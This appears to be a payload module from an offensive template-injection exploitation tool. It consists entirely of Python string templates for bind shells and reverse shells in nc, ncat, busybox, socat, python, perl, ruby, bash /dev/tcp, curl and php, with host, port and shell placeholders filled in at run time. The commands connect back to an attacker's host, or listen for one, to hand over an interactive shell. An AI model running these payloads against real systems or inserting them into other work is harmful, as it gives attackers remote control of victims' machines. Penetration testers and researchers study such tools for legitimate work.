os_print = """echo {s1}"""

bind_shell = [
    """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", SSTIMAP:port;));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("SSTIMAP:shell;");s.close()'""",
    """nc -l -p SSTIMAP:port; -e SSTIMAP:shell;""",
    """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|SSTIMAP:shell; -i 2>&1|nc -l SSTIMAP:port; >/tmp/f; rm -rf /tmp/f""",
    """socat tcp-l:SSTIMAP:port; exec:SSTIMAP:shell;""",
    """perl -e 'use Socket;$p=SSTIMAP:port;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("SSTIMAP:shell; -i");};'"""
]

reverse_shell = [
    """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|SSTIMAP:shell; -i 2>&1|nc SSTIMAP:host; SSTIMAP:port; >/tmp/f""",
    """sleep 1; nc -e SSTIMAP:shell; SSTIMAP:host; SSTIMAP:port;""",
    """sleep 1; ncat -e SSTIMAP:shell; SSTIMAP:host; SSTIMAP:port;""",
    """sleep 1; busybox nc -e SSTIMAP:shell; SSTIMAP:host; SSTIMAP:port;""",
    # """sleep 1; nc.exe -e SSTIMAP:shell; SSTIMAP:host; SSTIMAP:port;""",
    # """sleep 1; ncat.exe -e SSTIMAP:shell; SSTIMAP:host; SSTIMAP:port;""",
    """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SSTIMAP:host;",SSTIMAP:port;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["SSTIMAP:shell;","-i"]);'""",
    """sleep 1; /bin/bash -c 'SSTIMAP:shell; 0</dev/tcp/SSTIMAP:host;/SSTIMAP:port; 1>&0 2>&0'""",
    """sleep 1; perl -e 'use Socket;$i="SSTIMAP:host;";$p=SSTIMAP:port;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("SSTIMAP:shell; -i");}};'""",
    # TODO: ruby payload's broken, fix it.
    # """ruby -rsocket -e'f=TCPSocket.open("SSTIMAP:host;",SSTIMAP:port;).to_i;exec sprintf("SSTIMAP:shell; -i <&%d >&%d 2>&%d",f,f,f)'""",
    """sleep 1; ruby -rsocket -e'spawn("SSTIMAP:shell;",[:in,:out,:err]=>TCPSocket.new("SSTIMAP:host;",SSTIMAP:port;))'""",
    """sleep 1; socat TCP:SSTIMAP:host;:SSTIMAP:port; EXEC:SSTIMAP:shell;""",
    """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SSTIMAP:host;",SSTIMAP:port;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("SSTIMAP:shell;");'""",
    """sleep 1; C='curl -Ns telnet://SSTIMAP:host;:SSTIMAP:port;'; $C </dev/null 2>&1 | SSTIMAP:shell; 2>&1 | $C >/dev/null""",
    """sleep 1; php -r '$sock=fsockopen("SSTIMAP:host;",SSTIMAP:port;);`SSTIMAP:shell; <&3 >&3 2>&3`;'"""
]
